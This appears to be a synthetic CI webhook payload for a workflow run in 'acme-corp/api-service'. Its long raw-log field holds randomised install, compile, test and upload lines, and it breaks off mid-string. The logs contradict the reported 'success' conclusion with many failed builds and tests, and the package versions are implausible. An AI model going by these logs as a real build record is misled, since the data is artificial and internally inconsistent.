{
  "action": "completed",
  "workflow_run": {
    "id": 783,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-124",
    "head_sha": "18b2c19d01c67f852935414ba20bbac6f4949a1a",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-20T12:00:33.547797Z",
    "updated_at": "2025-12-20T12:04:17.758431Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: restore_cache ===\nInstalling react@1.11.0\n\u2713 lint completed\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\n  PASS: test_cache_hit (199ms)\n[12:00:33] INFO: Processing request\n  PASS: test_cache_hit (55ms)\n\u2713 test completed\nCache hit for key-3197\nCache hit for key-6629\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (13MB)\nInstalling lodash@1.15.0\nCompiling src/main.py...\nInstalling prettier@3.4.0\n\u2713 build completed\nStep 3/10: Building\n[12:00:33] INFO: Processing request\nStep 3/10: Building\n\u2713 lint completed\nInstalling webpack@1.2.0\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (13MB)\nCache hit for key-7793\n\u2713 test completed\nInstalling axios@5.0.0\n\u2713 lint completed\nInstalling prettier@2.18.0\n\u2713 test completed\n[12:00:33] INFO: Processing request\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (48MB)\nStep 3/10: Building\nStep 3/10: Building\nInstalling react@4.6.0\nCompiling src/app.ts...\nCompiling src/app.ts...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (20MB)\nCompiling src/service.java...\nCompiling src/handler.rs...\nCompiling src/index.js...\nWARNING: lodash has known vulnerabilities\n\u2713 lint completed\nWARNING: express has known vulnerabilities\n\u2717 build failed with exit code 87\nCache hit for key-8345\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2717 build failed with exit code 37\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_user_create (294ms)\n\u2713 build completed\nCache hit for key-3849\n\u2713 test completed\nInstalling eslint@3.16.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\n  PASS: test_auth_login (208ms)\n[12:00:33] INFO: Processing request\n\u2713 build completed\n  PASS: test_auth_login (201ms)\nCompiling src/main.py...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: build.tar.gz (12MB)\nInstalling eslint@3.8.0\nStep 7/10: Building\n\u2713 build completed\nCompiling src/utils.go...\nStep 3/10: Building\n\u2713 test completed\n  PASS: test_db_connect (270ms)\nCompiling src/handler.rs...\nCache hit for key-2952\n\u2713 test completed\nStep 2/10: Building\n[12:00:33] INFO: Processing request\nStep 9/10: Building\nInstalling jest@3.7.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (31MB)\nInstalling prettier@2.14.0\n\u2713 lint completed\n\u2713 build completed\n[12:00:33] ERROR: Connection failed\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (25MB)\nInstalling express@4.14.0\nArtifact uploaded: build.tar.gz (19MB)\nInstalling axios@5.2.0\nInstalling jest@2.20.0\n  PASS: test_db_connect (194ms)\nStep 2/10: Building\n\u2713 lint completed\n  PASS: test_api_health (286ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (8MB)\nCompiling src/app.ts...\nCompiling src/main.py...\nCache hit for key-6659\n\u2713 test completed\nStep 8/10: Building\n  PASS: test_api_health (260ms)\n[12:00:33] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/app.ts...\n\u2713 lint completed\n  PASS: test_auth_login (190ms)\nCompiling src/app.ts...\n\u2713 lint completed\n  PASS: test_db_connect (322ms)\n\u2713 test completed\nFAILED: test_user_create\n  PASS: test_api_health (185ms)\nCompiling src/main.py...\n[12:00:33] WARN: Deprecated API usage\nInstalling eslint@3.7.0\n  PASS: test_auth_login (113ms)\n  PASS: test_auth_login (268ms)\nCompiling src/index.js...\nStep 1/10: Building\nCache hit for key-4370\n[12:00:33] INFO: Processing request\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:33] INFO: Processing request\n\u2713 lint completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:33] INFO: Processing request\nStep 9/10: Building\n\u2713 test completed\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (46MB)\nCache hit for key-9063\nInstalling react@1.12.0\nStep 2/10: Building\n=== Step restore_cache completed ===\n=== Step: checkout ===\nCompiling src/utils.go...\nCompiling src/service.java...\nInstalling react@1.12.0\n\u2713 test completed\nCompiling src/utils.go...\nInstalling express@3.9.0\n  PASS: test_api_health (486ms)\n[12:00:33] INFO: Processing request\nStep 2/10: Building\nInstalling react@5.9.0\nCompiling src/main.py...\nInstalling react@2.7.0\n[12:00:33] INFO: Processing request\n\u2713 test completed\nCompiling src/utils.go...\nCache hit for key-1419\nCache hit for key-3299\n\u2713 test completed\nStep 7/10: Building\nInstalling jest@5.14.0\n[12:00:33] ERROR: Connection failed\n[12:00:33] INFO: Processing request\nFAILED: test_cache_hit\n\u2713 test completed\n\u2717 build failed with exit code 52\nStep 3/10: Building\nStep 10/10: Building\nCache hit for key-2377\nArtifact uploaded: build.tar.gz (48MB)\nInstalling jest@1.2.0\n\u2713 lint completed\nCache hit for key-7037\nStep 10/10: Building\n[12:00:33] INFO: Processing request\n  PASS: test_db_connect (286ms)\n[12:00:33] INFO: Processing request\nStep 3/10: Building\nCache hit for key-1630\nCache hit for key-4255\nCache hit for key-3774\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/utils.go...\n  PASS: test_db_connect (10ms)\nCompiling src/main.py...\nInstalling express@3.3.0\nStep 7/10: Building\n\u2713 build completed\nInstalling jest@1.16.0\nArtifact uploaded: build.tar.gz (8MB)\nCache hit for key-1912\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFAILED: test_db_connect\nStep 9/10: Building\n[12:00:33] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (35MB)\nInstalling jest@4.15.0\n\u2713 lint completed\n  PASS: test_cache_hit (500ms)\n[12:00:33] INFO: Processing request\nCompiling src/app.ts...\nStep 5/10: Building\n  PASS: test_api_health (106ms)\nCache hit for key-7970\n[12:00:33] INFO: Processing request\nCache hit for key-6757\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_db_connect (63ms)\n  PASS: test_db_connect (123ms)\nCache hit for key-5903\n\u2713 build completed\nInstalling express@1.15.0\nInstalling axios@3.14.0\nCompiling src/service.java...\n\u2713 lint completed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (8MB)\nCompiling src/main.py...\nInstalling jest@3.10.0\nStep 3/10: Building\nStep 6/10: Building\nInstalling axios@1.6.0\nInstalling axios@4.13.0\n[12:00:33] INFO: Processing request\nCache hit for key-3728\n  PASS: test_cache_hit (261ms)\nArtifact uploaded: build.tar.gz (14MB)\nCache hit for key-6798\nCache hit for key-8329\nArtifact uploaded: build.tar.gz (47MB)\nCompiling src/app.ts...\n\u2713 lint completed\nCache hit for key-7873\nCache hit for key-7214\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 test completed\nCache hit for key-9093\n  PASS: test_api_health (96ms)\nArtifact uploaded: build.tar.gz (10MB)\nCompiling src/app.ts...\nInstalling axios@1.8.0\nInstalling eslint@3.6.0\n  PASS: test_auth_login (205ms)\nInstalling prettier@2.18.0\nInstalling express@3.18.0\n[12:00:33] INFO: Processing request\nInstalling prettier@2.1.0\nCache hit for key-7924\nInstalling jest@5.6.0\n[12:00:33] INFO: Processing request\n\u2713 build completed\nCache hit for key-2720\nStep 4/10: Building\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (10MB)\nCache hit for key-3569\n[12:00:33] INFO: Processing request\nCache hit for key-4055\n[12:00:33] WARN: Deprecated API usage\nStep 4/10: Building\n[12:00:33] INFO: Processing request\n\u2713 lint completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-1454\n  PASS: test_db_connect (149ms)\nInstalling lodash@1.1.0\nFAILED: test_db_connect\nCompiling src/service.java...\n\u2713 build completed\n\u2713 lint completed\nCompiling src/handler.rs...\n  PASS: test_auth_login (446ms)\n  PASS: test_user_create (49ms)\nCompiling src/utils.go...\n  PASS: test_user_create (296ms)\n\u2713 build completed\nInstalling express@5.19.0\n\u2713 build completed\nInstalling eslint@3.2.0\n\u2713 lint completed\n=== Step checkout completed ===\n=== Step: build ===\nInstalling jest@1.4.0\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (9MB)\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_db_connect (443ms)\n\u2713 build completed\n[12:00:33] INFO: Processing request\nInstalling react@2.15.0\n[12:00:33] INFO: Processing request\nCache hit for key-1926\n  PASS: test_auth_login (434ms)\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-4027\n[12:00:33] INFO: Processing request\n  PASS: test_user_create (216ms)\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\n  PASS: test_db_connect (77ms)\n\u2713 test completed\nCompiling src/service.java...\n\u2713 lint completed\nStep 7/10: Building\nCompiling src/handler.rs...\n\u2713 lint completed\nCompiling src/service.java...\n[12:00:33] INFO: Processing request\nCompiling src/service.java...\n  PASS: test_api_health (484ms)\nStep 6/10: Building\n\u2713 test completed\n[12:00:33] INFO: Processing request\n\u2713 build completed\nStep 4/10: Building\nCompiling src/index.js...\nCompiling src/app.ts...\nInstalling react@1.1.0\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:33] INFO: Processing request\nInstalling prettier@2.19.0\nArtifact uploaded: build.tar.gz (2MB)\nStep 5/10: Building\nCompiling src/main.py...\n  PASS: test_db_connect (233ms)\nCache hit for key-8047\nCompiling src/main.py...\n\u2713 test completed\nCache hit for key-9876\n[12:00:33] WARN: Deprecated API usage\n[12:00:33] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (42MB)\n  PASS: test_db_connect (275ms)\n  PASS: test_api_health (90ms)\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:33] INFO: Processing request\nStep 6/10: Building\nInstalling lodash@5.0.0\nException: TypeError\nArtifact uploaded: build.tar.gz (26MB)\n  PASS: test_user_create (383ms)\nWARNING: express has known vulnerabilities\nInstalling jest@4.11.0\nCache hit for key-9358\n\u2713 test completed\n  PASS: test_auth_login (224ms)\nCache hit for key-1413\n\u2713 test completed\n\u2717 build failed with exit code 70\n[12:00:33] WARN: Deprecated API usage\n[12:00:33] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_api_health (164ms)\nCache hit for key-6213\nArtifact uploaded: build.tar.gz (18MB)\nStep 9/10: Building\n[12:00:33] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/handler.rs...\nCache hit for key-7277\nInstalling express@1.8.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:33] INFO: Processing request\nInstalling lodash@1.0.0\n  PASS: test_auth_login (372ms)\nCache hit for key-1897\nStep 2/10: Building\nInstalling react@2.2.0\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (18MB)\n[12:00:33] INFO: Processing request\nCache hit for key-6230\nCompiling src/utils.go...\nCompiling src/utils.go...\nCompiling src/app.ts...\n\u2713 build completed\nStep 10/10: Building\nCompiling src/service.java...\nCache hit for key-2527\n  PASS: test_db_connect (343ms)\nStep 7/10: Building\n[12:00:33] INFO: Processing request\n  PASS: test_cache_hit (395ms)\n\u2717 build failed with exit code 7\n\u2713 build completed\nCompiling src/handler.rs...\n[12:00:33] INFO: Processing request\nStep 2/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-5087\nCompiling src/index.js...\n  PASS: test_auth_login (183ms)\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (1MB)\nCompiling src/handler.rs...\nCache hit for key-9132\nArtifact uploaded: build.tar.gz (9MB)\nCache hit for key-3820\nCache hit for key-3413\nInstalling axios@1.16.0\nArtifact uploaded: build.tar.gz (30MB)\nInstalling eslint@4.10.0\n[12:00:33] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 3/10: Building\nCache hit for key-1898\n  PASS: test_user_create (346ms)\n[12:00:33] INFO: Processing request\nInstalling prettier@5.17.0\nCache hit for key-2398\nArtifact uploaded: build.tar.gz (35MB)\nInstalling express@3.3.0\nCache hit for key-1504\n  PASS: test_db_connect (302ms)\nInstalling prettier@2.7.0\n  PASS: test_auth_login (222ms)\nCache hit for key-1205\n  PASS: test_user_create (132ms)\nCache hit for key-4538\nStep 8/10: Building\nCompiling src/service.java...\n=== Step build completed ===\n=== Step: setup_environment ===\n\u2713 test completed\n[12:00:33] WARN: Deprecated API usage\nInstalling eslint@5.16.0\nCache hit for key-4054\n\u2717 build failed with exit code 119\nStep 3/10: Building\nCompiling src/handler.rs...\nCache hit for key-6113\nStep 5/10: Building\nCompiling src/app.ts...\nStep 3/10: Building\n\u2713 build completed\n\u2713 build completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (27MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-3766\n\u2713 build completed\nCache hit for key-6133\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 5/10: Building\n[12:00:33] WARN: Deprecated API usage\nCache hit for key-7703\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-5723\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (5MB)\nCache hit for key-9417\nCache hit for key-2841\n\u2713 lint completed\n\u2713 build completed\n\u2713 test completed\nInstalling prettier@3.15.0\n  PASS: test_db_connect (108ms)\nStep 2/10: Building\n\u2713 build completed\nInstalling prettier@2.15.0\nWARNING: jest has known vulnerabilities\nInstalling axios@4.2.0\nWARNING: webpack has known vulnerabilities\n[12:00:33] ERROR: Connection failed\n[12:00:33] INFO: Processing request\n  PASS: test_db_connect (7ms)\nStep 10/10: Building\nWARNING: jest has known vulnerabilities\nCache hit for key-9434\n[12:00:33] INFO: Processing request\n\u2713 lint completed\nStep 1/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (33MB)\nCompiling src/service.java...\nCompiling src/utils.go...\nCache hit for key-4527\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (35MB)\nArtifact uploaded: build.tar.gz (45MB)\nWARNING: axios has known vulnerabilities\nCompiling src/utils.go...\nCompiling src/handler.rs...\nCompiling src/main.py...\nInstalling lodash@2.3.0\nCache hit for key-3486\n  PASS: test_api_health (103ms)\nArtifact uploaded: build.tar.gz (15MB)\nStep 5/10: Building\nCache hit for key-9089\nCache hit for key-7515\nWARNING: react has known vulnerabilities\nStep 4/10: Building\nInstalling jest@4.3.0\n[12:00:33] WARN: Deprecated API usage\n  PASS: test_db_connect (110ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_user_create (190ms)\nCache hit for key-6240\nCache hit for key-8527\n\u2713 build completed\nStep 4/10: Building\n  PASS: test_api_health (2ms)\n\u2713 lint completed\n\u2713 build completed\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (36MB)\nInstalling axios@2.10.0\n\u2713 build completed\n  PASS: test_auth_login (270ms)\nInstalling webpack@1.10.0\nStep 7/10: Building\n\u2713 lint completed\nCompiling src/service.java...\nCache hit for key-2716\nCache hit for key-3039\nArtifact uploaded: build.tar.gz (19MB)\nStep 4/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 lint completed\nInstalling eslint@5.10.0\nStep 2/10: Building\n\u2713 build completed\nStep 9/10: Building\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_cache_hit (107ms)\nCache hit for key-4128\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/main.py...\nInstalling express@3.2.0\nWARNING: react has known vulnerabilities\nCompiling src/app.ts...\n\u2713 lint completed\n\u2713 lint completed\nWARNING: eslint has known vulnerabilities\nWARNING: lodash has known vulnerabilities\nInstalling express@2.10.0\nInstalling axios@4.19.0\n\u2713 build completed\nCache hit for key-3638\nArtifact uploaded: build.tar.gz (12MB)\nCache hit for key-3300\nStep 8/10: Building\n  PASS: test_user_create (239ms)\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (26MB)\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:33] INFO: Processing request\nCache hit for key-7320\n  PASS: test_user_create (131ms)\nInstalling express@1.17.0\n  PASS: test_cache_hit (185ms)\n  PASS: test_db_connect (321ms)\nInstalling jest@1.1.0\nCache hit for key-2938\nCache hit for key-7877\nInstalling express@5.15.0\nStep 8/10: Building\n  PASS: test_db_connect (27ms)\nException: ValueError\n=== Step setup_environment completed ===\n=== Step: type_check ===\nStep 2/10: Building\nCompiling src/service.java...\nStep 2/10: Building\n\u2713 build completed\n[12:00:33] WARN: Deprecated API usage\nCache hit for key-5349\n[12:00:33] INFO: Processing request\nCache hit for key-2055\n[12:00:33] WARN: Deprecated API usage\nStep 5/10: Building\nCompiling src/app.ts...\nCompiling src/handler.rs...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/handler.rs...\n[12:00:33] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nCache hit for key-7063\nStep 6/10: Building\nCache hit for key-7035\n  PASS: test_api_health (83ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (40MB)\nWARNING: prettier has known vulnerabilities\nStep 9/10: Building\nCompiling src/main.py...\nStep 3/10: Building\n  PASS: test_db_connect (467ms)\nCache hit for key-5286\nWARNING: webpack has known vulnerabilities\nCompiling src/main.py...\n\u2713 test completed\n[12:00:33] INFO: Processing request\n\u2713 lint completed\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (16MB)\n[12:00:33] INFO: Processing request\n\u2713 test completed\nCache hit for key-8364\nArtifact uploaded: build.tar.gz (18MB)\nCompiling src/utils.go...\nCache hit for key-3089\n\u2713 build completed\nCache hit for key-7606\n  PASS: test_auth_login (181ms)\nInstalling webpack@4.16.0\nArtifact uploaded: build.tar.gz (24MB)\n  PASS: test_api_health (290ms)\n\u2713 test completed\nInstalling prettier@5.0.0\nWARNING: prettier has known vulnerabilities\nCache hit for key-8026\n[12:00:33] WARN: Deprecated API usage\nCompiling src/main.py...\n[12:00:33] INFO: Processing request\nInstalling express@2.13.0\nFAILED: test_cache_hit\n\u2713 lint completed\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_user_create (290ms)\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:33] INFO: Processing request\n\u2713 test completed\nInstalling jest@5.18.0\nInstalling react@1.2.0\nInstalling express@3.1.0\nInstalling webpack@5.10.0\nArtifact uploaded: build.tar.gz (21MB)\nCompiling src/app.ts...\n\u2713 lint completed\n[12:00:33] INFO: Processing request\nCompiling src/service.java...\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (13MB)\nCompiling src/utils.go...\nInstalling jest@5.3.0\nCompiling src/handler.rs...\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nCache hit for key-4223\nArtifact uploaded: build.tar.gz (47MB)\nInstalling webpack@5.1.0\nException: RuntimeError\nInstalling webpack@2.10.0\nCache hit for key-2481\nStep 8/10: Building\nCompiling src/main.py...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (43MB)\n[12:00:33] WARN: Deprecated API usage\n[12:00:33] INFO: Processing request\nCache hit for key-6667\nArtifact uploaded: build.tar.gz (23MB)\nCompiling src/index.js...\nCompiling src/main.py...\nStep 8/10: Building\nCompiling src/main.py...\nCompiling src/handler.rs...\n\u2713 build completed\nInstalling axios@3.6.0\n  PASS: test_api_health (49ms)\nInstalling react@5.19.0\nStep 4/10: Building\nInstalling prettier@1.14.0\nCache hit for key-1484\n\u2717 build failed with exit code 99\n  PASS: test_cache_hit (184ms)\nCompiling src/index.js...\n[12:00:33] INFO: Processing request\nCache hit for key-1952\n\u2713 lint completed\n  PASS: test_user_create (375ms)\nCache hit for key-5321\n\u2713 test completed\nInstalling jest@1.0.0\nInstalling axios@5.20.0\nFAILED: test_cache_hit\nCache hit for key-9444\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 build completed\nCompiling src/index.js...\nCompiling src/utils.go...\n[12:00:33] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\n\u2713 test completed\nStep 10/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 7/10: Building\nInstalling eslint@4.15.0\nCache hit for key-1736\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nCache hit for key-5552\nCompiling src/service.java...\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (26MB)\nCache hit for key-4975\nCache hit for key-8888\n  PASS: test_db_connect (238ms)\nInstalling express@1.3.0\n=== Step type_check completed ===\n=== Step: unit_tests ===\nCompiling src/main.py...\n  PASS: test_user_create (445ms)\nArtifact uploaded: build.tar.gz (10MB)\nException: ValueError\n\u2713 build completed\nCache hit for key-5933\nInstalling prettier@2.13.0\n[12:00:33] INFO: Processing request\nStep 10/10: Building\n\u2713 lint completed\nStep 9/10: Building\n\u2713 lint completed\n[12:00:33] ERROR: Connection failed\nCompiling src/app.ts...\n  PASS: test_auth_login (34ms)\n  PASS: test_user_create (351ms)\nCache hit for key-3833\nCompiling src/utils.go...\nCompiling src/handler.rs...\nWARNING: lodash has known vulnerabilities\nStep 8/10: Building\n\u2713 test completed\n  PASS: test_db_connect (381ms)\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:33] INFO: Processing request\nCompiling src/utils.go...\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_api_health (24ms)\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (14MB)\n\u2713 build completed\nInstalling jest@3.18.0\nInstalling express@2.6.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/main.py...\nInstalling eslint@3.2.0\nInstalling prettier@3.11.0\n\u2713 build completed\nInstalling react@1.13.0\nInstalling lodash@1.8.0\nCompiling src/service.java...\n[12:00:33] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\nCompiling src/handler.rs...\nWARNING: jest has known vulnerabilities\nWARNING: lodash has known vulnerabilities\nStep 10/10: Building\n[12:00:33] INFO: Processing request\nStep 4/10: Building\n[12:00:33] INFO: Processing request\nCache hit for key-1948\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling prettier@5.1.0\nCache hit for key-8690\nStep 10/10: Building\nCache hit for key-6319\nStep 3/10: Building\nStep 5/10: Building\nCompiling src/main.py...\nInstalling react@1.14.0\n  PASS: test_cache_hit (482ms)\nCompiling src/app.ts...\n\u2713 test completed\nCache hit for key-2672\nInstalling webpack@5.7.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:33] INFO: Processing request\nCache hit for key-5439\nInstalling prettier@1.7.0\n[12:00:33] INFO: Processing request\nCompiling src/main.py...\nStep 5/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_api_health (27ms)\nArtifact uploaded: build.tar.gz (25MB)\nInstalling jest@2.9.0\nCompiling src/utils.go...\nCache hit for key-6098\n[12:00:33] ERROR: Connection failed\n\u2713 test completed\nCompiling src/utils.go...\nStep 4/10: Building\nInstalling prettier@3.11.0\n[12:00:33] INFO: Processing request\n  PASS: test_user_create (223ms)\nStep 6/10: Building\nCache hit for key-7869\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:33] INFO: Processing request\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (38MB)\nInstalling eslint@1.11.0\n[12:00:33] ERROR: Connection failed\nInstalling lodash@1.15.0\nCache hit for key-5493\n[12:00:33] INFO: Processing request\n\u2713 build completed\n[12:00:33] INFO: Processing request\n  PASS: test_user_create (274ms)\n\u2713 lint completed\nCompiling src/handler.rs...\n\u2713 build completed\n[12:00:33] INFO: Processing request\nInstalling prettier@3.11.0\nInstalling react@3.9.0\nStep 9/10: Building\n\u2713 build completed\n\u2713 test completed\nInstalling lodash@2.12.0\nInstalling axios@3.1.0\nCache hit for key-2031\nStep 8/10: Building\n[12:00:33] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-3635\n[12:00:33] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling jest@3.18.0\n  PASS: test_api_health (50ms)\nArtifact uploaded: build.tar.gz (16MB)\nInstalling jest@5.17.0\n[12:00:33] INFO: Processing request\nCache hit for key-7900\n\u2713 lint completed\nInstalling webpack@5.16.0\nStep 7/10: Building\nCache hit for key-3865\nCache hit for key-3575\n  PASS: test_cache_hit (292ms)\nCompiling src/handler.rs...\nInstalling react@5.7.0\n  PASS: test_user_create (112ms)\nInstalling jest@4.2.0\nCache hit for key-3379\nStep 4/10: Building\nCache hit for key-3223\nStep 9/10: Building\nCompiling src/service.java...\n=== Step unit_tests completed ===\n=== Step: e2e_tests ===\n\u2713 test completed\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:33] INFO: Processing request\nStep 10/10: Building\n  PASS: test_auth_login (304ms)\n  PASS: test_auth_login (13ms)\nCompiling src/handler.rs...\nInstalling prettier@5.18.0\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (18MB)\nStep 5/10: Building\nStep 2/10: Building\n  PASS: test_db_connect (492ms)\n[12:00:33] INFO: Processing request\nInstalling prettier@3.8.0\n[12:00:33] ERROR: Connection failed\nStep 5/10: Building\nInstalling express@1.9.0\nCache hit for key-6285\nStep 5/10: Building\nCompiling src/handler.rs...\nCompiling src/index.js...\n[12:00:33] WARN: Deprecated API usage\nInstalling jest@2.2.0\n  PASS: test_db_connect (159ms)\nArtifact uploaded: build.tar.gz (19MB)\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:33] WARN: Deprecated API usage\nInstalling express@3.9.0\nStep 4/10: Building\nWARNING: express has known vulnerabilities\nCompiling src/service.java...\nCompiling src/service.java...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (7MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (13MB)\n\u2713 lint completed\nWARNING: eslint has known vulnerabilities\nCompiling src/utils.go...\nStep 3/10: Building\nStep 3/10: Building\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-4845\n\u2713 test completed\nInstalling jest@1.16.0\nStep 9/10: Building\nStep 9/10: Building\nStep 5/10: Building\n[12:00:33] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:33] INFO: Processing request\nInstalling webpack@5.7.0\n[12:00:33] INFO: Processing request\n  PASS: test_user_create (308ms)\n[12:00:33] INFO: Processing request\nInstalling prettier@3.1.0\nCompiling src/utils.go...\nCompiling src/handler.rs...\nCache hit for key-7093\nStep 10/10: Building\nCompiling src/service.java...\nCompiling src/app.ts...\n[12:00:33] INFO: Processing request\nStep 5/10: Building\nInstalling react@1.8.0\nStep 2/10: Building\nCache hit for key-6222\nCompiling src/index.js...\nInstalling webpack@5.20.0\nStep 4/10: Building\nInstalling prettier@3.17.0\n\u2713 lint completed\n[12:00:33] INFO: Processing request\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (1MB)\n\u2713 lint completed\nCache hit for key-6130\n\u2713 build completed\nCompiling src/index.js...\n[12:00:33] ERROR: Connection failed\nStep 6/10: Building\n  PASS: test_auth_login (109ms)\nCompiling src/app.ts...\nInstalling react@4.19.0\n  PASS: test_api_health (327ms)\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_cache_hit (141ms)\n  PASS: test_auth_login (310ms)\nCache hit for key-2308\nCompiling src/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:33] INFO: Processing request\nInstalling eslint@5.15.0\n[12:00:33] INFO: Processing request\n\u2713 test completed\nInstalling react@1.8.0\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:33] INFO: Processing request\n  PASS: test_user_create (35ms)\n[12:00:33] INFO: Processing request\nStep 9/10: Building\n[12:00:33] INFO: Processing request\n  PASS: test_auth_login (379ms)\nStep 7/10: Building\n[12:00:33] INFO: Processing request\n  PASS: test_cache_hit (104ms)\nCache hit for key-1138\n  PASS: test_user_create (423ms)\nInstalling react@3.15.0\nWARNING: prettier has known vulnerabilities\nArtifact uploaded: build.tar.gz (32MB)\nStep 4/10: Building\n  PASS: test_cache_hit (187ms)\nInstalling webpack@3.3.0\nInstalling axios@2.12.0\n[12:00:33] INFO: Processing request\nStep 5/10: Building\n[12:00:33] INFO: Processing request\nCompiling src/utils.go...\nWARNING: lodash has known vulnerabilities\n\u2713 build completed\nInstalling prettier@2.8.0\nInstalling express@2.7.0\n  PASS: test_user_create (118ms)\nArtifact uploaded: build.tar.gz (4MB)\nArtifact uploaded: build.tar.gz (25MB)\nException: 